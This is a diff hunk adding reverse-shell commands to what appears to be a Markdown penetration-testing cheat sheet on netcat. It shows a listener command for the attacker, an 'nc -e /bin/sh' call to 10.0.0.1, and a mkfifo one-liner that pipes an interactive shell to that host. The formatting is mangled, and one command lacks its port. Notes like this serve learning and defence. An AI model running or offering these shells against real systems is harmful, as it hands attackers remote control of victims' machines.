@@ -30,6 +30,16 @@ It is used to manually perform all kinds of network interactions, including thin
 * `-n` tells netcat not to resolve host names or use DNS.
 * `-p` indicates that the port specification will follows
 
+On the attacker's machine: \``nc` `` -lvp 1234` ``
+
+On the victim's machine: \``nc` `-e /bin/sh` `` 10.0.0.1` ``
+
+On the victim's machine if Netcat does not support the `-e` parameter:&#x20;
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
 #### Bind Shells[​](broken-reference) <a href="#bind-shells" id="bind-shells"></a>
 
 ```
